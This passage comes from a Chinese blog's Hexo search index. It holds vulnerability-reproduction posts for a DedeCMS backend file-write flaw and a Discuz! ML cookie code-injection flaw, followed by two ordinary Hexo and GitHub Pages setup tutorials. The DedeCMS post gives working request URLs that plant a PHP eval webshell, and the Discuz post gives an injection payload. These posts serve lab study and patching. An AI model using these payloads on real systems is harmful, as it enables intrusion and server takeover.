[a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，        导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了</code></pre><p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p><hr><h1 id="三-、漏洞复现"><a href="#三-、漏洞复现" class="headerlink" title="三 、漏洞复现"></a>三 、漏洞复现</h1><p>获取token，访问 域名 + /dede/tpl.php?action=upload<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104103.png" alt><br>然后查看网页源代码，找到token<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104145.png" alt><br>构造payload如下<br><a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</a><br>访问了成功写入<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104653.png" alt><br>访问写入的文件，域名+include/taglib/（你上传的文件名）.lib.php<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104810.png" alt><br>也可以构造一句话木马payload，<a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</a><br>直接用菜刀连接<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724105245.png" alt></p><hr><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然这个漏洞很鸡肋，需要拿到管理员账号密码才行，但还是有必要复现了解，反复练习才能有进步。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01221" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://blog.csdn.net/qq_41954384/article/details/93057317" target="_blank" rel="noopener">dedeCMS后台代码执行漏洞-CNVD-2018-01221</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> dedecms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz ML! V3.X 代码注入漏洞复现</title>
      <link href="/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，<br>攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，<br>进行远程代码执行利用，该漏洞利用方式简单，危害性较大。<br>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p><p><strong>漏洞影响版本：</strong><br>Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3 product of codersclub.org</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建Discuz！ML 环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724113043.png" alt></p><p>在主页进行抓包，修改Language的值，添加  <code>&#39;.phpinfo().&#39;</code><br>成功复现该漏洞<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724114153.png" alt></p><hr><h1 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h1><p>由于代码包含的原因，所以注入到缓存文件中的恶意代码直接执行，其中首页就有包涵，<br>全局搜索一下的话，应该有不少地方有进行包含可以直接利用，危害很大。<br>VulkeyChen师傅的建议：单看语言这个点，在/source/class/discuz/discuz_application.php<br>第338行之后341行之前加入该代码暂缓此安全问题：</p><pre><code>$lng = str_replace(&quot;(&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;)&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;&#39;&quot;,&quot;&quot;,$lng);$lng = str_replace(&#39;&quot;&#39;,&quot;&quot;,$lng);$lng = str_replace(&#39;`&#39;,&quot;&quot;,$lng);</code></pre><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://blog.topsec.com.cn/discuz-ml-v3-x-代码注入漏洞深度分析/" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a><br><a href="https://www.cnblogs.com/-mo-/p/11180396.html" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github分支备份hexo</title>
      <link href="/2019/07/05/github-fen-zhi-bei-fen-hexo/"/>
      <url>/2019/07/05/github-fen-zhi-bei-fen-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>使用hexo搭建个人博客框架，配置起来有些消耗时间，管理起来也不是特别方便。特别是有时需要在其他电脑上写博客时，就让人头疼。所以我们就利用Github的分支，来备份hexo，方便快速搭上手写博客。</p><hr><h1 id="二、创建本地分支目录"><a href="#二、创建本地分支目录" class="headerlink" title="二、创建本地分支目录"></a>二、创建本地分支目录</h1><h2 id="1-新建文件夹存放分支工作目录。"><a href="#1-新建文件夹存放分支工作目录。" class="headerlink" title="1. 新建文件夹存放分支工作目录。"></a>1. 新建文件夹存放分支工作目录。</h2><p><code>mkdir hexo</code></p><h2 id="2-把你的GitHub的远程仓库克隆到hexo文件夹"><a href="#2-把你的GitHub的远程仓库克隆到hexo文件夹" class="headerlink" title="2. 把你的GitHub的远程仓库克隆到hexo文件夹"></a>2. 把你的GitHub的远程仓库克隆到hexo文件夹</h2><p><code>git clone https://github.com/yourusername/yourusername.github.io hexo</code></p><h2 id="3-删除除了版本管理的-git之外的所有文件和文件夹"><a href="#3-删除除了版本管理的-git之外的所有文件和文件夹" class="headerlink" title="3. 删除除了版本管理的.git之外的所有文件和文件夹"></a>3. 删除除了版本管理的.git之外的所有文件和文件夹</h2><pre><code>cd hexorm -r *</code></pre><h2 id="4-把要备份的文件复制到hexo目录"><a href="#4-把要备份的文件复制到hexo目录" class="headerlink" title="4. 把要备份的文件复制到hexo目录"></a>4. 把要备份的文件复制到hexo目录</h2><pre><code>scaffolds/source/themes/.git/.gitignore_config.ymlpackage.json</code></pre><blockquote><p>注意：<br>如果使用的主题是从Github克隆的，那么使用命令删除它的Git文件（以next主题为例）<br><code>rm -R themes/next/.git*</code></p></blockquote><hr><h1 id="三、创建分支"><a href="#三、创建分支" class="headerlink" title="三、创建分支"></a>三、创建分支</h1><h2 id="1-新建仓库"><a href="#1-新建仓库" class="headerlink" title="1. 新建仓库"></a>1. 新建仓库</h2><p>在blog项目仓库下，输入备份分支hexo，点击create创建（因为我已经创建过了，所以显示的不一样）<br>或者在本地使用命令 <code>git checkout -b hexo</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705133032.png" alt></p><h2 id="2-点击设置，把默认分支设置为新建的备份分支"><a href="#2-点击设置，把默认分支设置为新建的备份分支" class="headerlink" title="2. 点击设置，把默认分支设置为新建的备份分支"></a>2. 点击设置，把默认分支设置为新建的备份分支</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132053.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132123.png" alt></p><hr><h1 id="四、提交备份"><a href="#四、提交备份" class="headerlink" title="四、提交备份"></a>四、提交备份</h1><p>在本地的hexo文件夹打开git bash，依次执行以下命令：</p><pre><code>git add -all   #保存所有文件到暂存区git commit -m &quot;创建hexo分支&quot; #提交变更git push --set-upstream origin hexo#推送到Github，并用`--set-upstream`与origin创建关联#将hexo设置为默认分区</code></pre><hr><h1 id="五、合并管理"><a href="#五、合并管理" class="headerlink" title="五、合并管理"></a>五、合并管理</h1><p>将本地hexo分支中的.git文件夹复制到博客根目录中，<br>我们只需要手动管理hexo分支中的文件（备份），<br>.gitignore之外的文件由hexo管理（hexo d）<br>移除主题目录下的Git管理文件</p><p><code>rm -R themes/next/.git* #以next主题为例</code></p><p>master分支的文件则由hexo管理，编辑hexo配置文件<em>_config.yml</em></p><pre><code>deploy:        type: git        repo: https://github.com/yourusername/yourusername.github.io        branch: master</code></pre><hr><h1 id="六、发表文章及修改配置"><a href="#六、发表文章及修改配置" class="headerlink" title="六、发表文章及修改配置"></a>六、发表文章及修改配置</h1><h2 id="1-将相关更改（配置修改或发表文章）推送到hexo分支"><a href="#1-将相关更改（配置修改或发表文章）推送到hexo分支" class="headerlink" title="1. 将相关更改（配置修改或发表文章）推送到hexo分支"></a>1. 将相关更改（配置修改或发表文章）推送到hexo分支</h2><pre><code>git add .git commit -m &quot;修改配置/发表文章&quot;git push origin hexo</code></pre><h2 id="2-将静态文件推送到master分支"><a href="#2-将静态文件推送到master分支" class="headerlink" title="2. 将静态文件推送到master分支"></a>2. 将静态文件推送到master分支</h2><pre><code>hexo clean hexo ghexo d</code></pre><hr><h1 id="七、迁移"><a href="#七、迁移" class="headerlink" title="七、迁移"></a>七、迁移</h1><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><pre><code>npm install -g hexo-clihexo initnpm install</code></pre><h2 id="2-克隆hexo分支"><a href="#2-克隆hexo分支" class="headerlink" title="2. 克隆hexo分支"></a>2. 克隆hexo分支</h2><p><code>git clone -b hexo https://github.com/username/username.github.io</code></p><hr><p>这样就可以进行写作了，写完记得同步备份博客。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990" target="_blank" rel="noopener">【GitHub】创建Git分支将Hexo博客迁移到其它电脑</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> hexo </tag>
            
            <tag> 备份 </tag>
            
            <tag> 分支 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages+Hexo搭建个人博客（踩坑之路）</title>
      <link href="/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/"/>
      <url>/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实很早之前就想搭建一个个人博客，出于各种原因，一直没有行动。最近终于着手开始搭建，希望自己可以一直坚持下去。在搭建的过程中，踩了不少坑，特此记录，也希望对后来人有一点点参考价值。</p><hr><h1 id="一、Github"><a href="#一、Github" class="headerlink" title="一、Github"></a>一、Github</h1><h2 id="1-注册Github账号"><a href="#1-注册Github账号" class="headerlink" title="1. 注册Github账号"></a>1. 注册Github账号</h2><p>进入<a href="https://github.com" target="_blank" rel="noopener">Github</a>官网，注册账号。</p><h2 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2. 创建仓库"></a>2. 创建仓库</h2><p>点击首页右上角头像左侧的头像<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705010509.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011051.png" alt></p><h2 id="3-Github-Pages"><a href="#3-Github-Pages" class="headerlink" title="3. Github Pages"></a>3. Github Pages</h2><p>点击Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011609.png" alt><br>找到GitHub Pages，以用户名命名的仓库自动开启github pages，确认开启后就可以通过给出的网址访问了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011514.png" alt></p><hr><h1 id="二、Hexo"><a href="#二、Hexo" class="headerlink" title="二、Hexo"></a>二、Hexo</h1><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>是一个快速、简洁且高效的博客框架，可以参考官方文档。</p><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><p>要使用hexo，必须安装<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a>和<a href="https://git-scm.com/download/" target="_blank" rel="noopener">Git</a>。网上教程很多，这里不再赘述。</p><h2 id="2-hexo安装"><a href="#2-hexo安装" class="headerlink" title="2. hexo安装"></a>2. hexo安装</h2><p>先创建存放blog文件的文件夹，切换到此文件夹右击git bash打开<br>输入命令安装hexo：<br><code>npm install -g hexo-cli</code></p><p>依次执行：</p><pre><code>hexo init npm installhexo g #生成静态网页hexo s #启动本地服务</code></pre><p>完成后，在浏览器输入localhost:4000就可以看到你的博客了</p><hr><h1 id="三、部署到Github"><a href="#三、部署到Github" class="headerlink" title="三、部署到Github"></a>三、部署到Github</h1><h2 id="1-设置SSH"><a href="#1-设置SSH" class="headerlink" title="1. 设置SSH"></a>1. 设置SSH</h2><p>返回GIt Bash中，依次输入：</p><pre><code>git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;</code></pre><p>这里的yourname输入你的Github的用户名，<br>youremail输入你的Github邮箱</p><pre><code>cd ~/.sshlsmkdir key_backupcp id_rsa* key_backuprm id_rsa*#检查有没有生成过SSH并备份移除ssh-keygen -t rsa -C &quot;youremail&quot; #生成新的SSH，接下来输入密码 一路回车</code></pre><h2 id="2-添加SSH-Key到Github"><a href="#2-添加SSH-Key到Github" class="headerlink" title="2.添加SSH Key到Github"></a>2.添加SSH Key到Github</h2><p>点击头像，选择Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022259.png" alt><br>添加新的SSH Key<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022426.png" alt><br>找到c:\users\当前用户名.ssh    文本形式打开id_ras.pub (打开系统查看隐藏文件选项)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022656.png" alt><br>测试是否连接成功<br><code>ssh -T git@github.com</code><br>输入yes就ok</p><h2 id="3-部署到Github"><a href="#3-部署到Github" class="headerlink" title="3. 部署到Github"></a>3. 部署到Github</h2><p>打开hexo配置文件（根目录）<strong>_config.yml</strong><br>翻到最后将xxx修改为你的Github账户（冒号后面有一个空格）</p><pre><code>deploy:    type: git    repo: https://github.com/xxx/xxx.github.io.git    branch: master</code></pre><p>然后安装deploy-git(不然报错”ERROR Deployer not found: git“)<br><code>npm install hexo-deployer-git --save</code></p><p>然后</p><pre><code>hexo cleanhexo ghexo d</code></pre><p>deploy时可能要你输入密码，再刷新username.github.io就可以看到你的blog。</p><hr><p><strong>注意：</strong></p><blockquote><p>如果输入命令的过程中出现了”LF will be replaced by CRLF”报错，<br>    1. windows中的换行符为 CRLF，而在Linux下的换行符为LF，所以在执行add . 时出现提示<br>    2. CRLF和LF是两种不同的换行格式，git工作区默认为CRLF来作为换行符，<br>        所以当我们项目文件里有用的地方使用LF作为换行符，这个时候我们再继续git add<br>        或者git commit的时候就会弹出警告，当最终push到远程仓库的时候git会统一格式全部转化为用CRLF作为换行符 </p></blockquote><p><strong>解决办法：</strong></p><blockquote><ol><li>这个只是一个警告，我们直接忽略就好。</li><li>git config –global core.autocrlf false  //禁用自动转换 </li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
